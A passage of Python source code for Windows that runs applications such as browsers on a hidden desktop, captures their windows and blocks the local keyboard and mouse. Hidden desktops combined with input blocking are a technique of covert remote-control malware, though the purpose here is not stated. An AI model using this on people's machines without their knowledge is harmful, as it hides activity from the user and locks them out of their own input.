        time.sleep(1.0)
    
    def launch_application(self, app_name: str, url: str | None = None) -> None:
        """Launch an application on the hidden desktop.
        
        Args:
            app_name: Application name (chrome, firefox, etc.) or full path
            url: Optional URL to open (for browsers)
        """
        exe = _resolve_app_executable(app_name)
        if not exe:
            raise FileNotFoundError(f"Application not found: {app_name}")
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 5  # SW_SHOW - need visible for PrintWindow
        
        cmd = [exe]
        if url:
            cmd.append(url)
        
        proc = subprocess.Popen(cmd, startupinfo=startupinfo)
        self._processes.append(proc)
        
        # Give app time to create window
        time.sleep(1.0)
        
        logger.info("Launched %s on hidden desktop (PID: %d)", app_name, proc.pid)
    
    def get_windows(self) -> list:
        """Get list of tracked windows."""
        return self._capture.get_windows()
    
    def block_local_input(self) -> bool:
        """Block local keyboard and mouse input."""
        if self._input_blocked:
            return True
        self._input_blocked = _toggle_block_input(True)
        if not self._input_blocked:
            logger.warning("Failed to block local input.")
        return self._input_blocked
    
    def unblock_local_input(self) -> None:
        """Unblock local keyboard and mouse input."""
        if self._input_blocked:
            _toggle_block_input(False)
            self._input_blocked = False
    
    @property
    def mode(self) -> str:
        """Get the current operating mode."""
        return "printwindow"
    
    @property
    def is_virtual_display_active(self) -> bool:
        """PrintWindow mode doesn't use virtual display."""
        return False
    
    def close(self) -> None:
        """Clean up session resources."""
        logger.info("Closing HiddenWindowSession")
        
        self.screen_track.stop()
        self.input_controller.close()
        self.unblock_local_input()
        
        # Terminate processes
        for proc in self._processes:
            try:
                proc.terminate()
            except Exception:
                pass
        self._processes.clear()
        
        # Close capture
        self._capture.close()
        
        # Close desktop
        _close_desktop(self._desktop_handle)
        self._desktop_handle = None


def create_hidden_session(mode: str = "auto", **kwargs):
    """Factory function to create appropriate hidden session.
    
    Args:
        mode: Session mode - "auto", "printwindow", "virtual_display", or "fallback"
        **kwargs: Additional arguments passed to session constructor
    
    Returns:
        Session instance (HiddenWindowSession or HiddenDesktopSession)
    
    Note:
        PrintWindow mode only works when explicitly requested, as it requires
        windows to be on the same desktop for capture to work correctly.
    """
    if mode == "printwindow":
        if not PRINTWINDOW_AVAILABLE:
            raise RuntimeError("PrintWindow mode not available")
        return HiddenWindowSession(**kwargs)
    
    if mode == "virtual_display":
        return HiddenDesktopSession(use_virtual_display=True, **kwargs)
    
    if mode == "fallback":
        return HiddenDesktopSession(use_virtual_display=False, **kwargs)
    
    # Auto mode: try virtual display first, then fallback
    # PrintWindow is NOT used in auto mode because it cannot capture 
    # windows from a different desktop
    if mode == "auto":
        try:
            session = HiddenDesktopSession(use_virtual_display=True, **kwargs)
            if session.is_virtual_display_active:
                logger.info("Using virtual display mode")
                return session
            logger.info("Virtual display not active, using fallback mode")
            return session
        except Exception as exc:
            logger.warning("HiddenDesktopSession failed: %s", exc)
            raise
    
    raise ValueError(f"Unknown mode: {mode}")
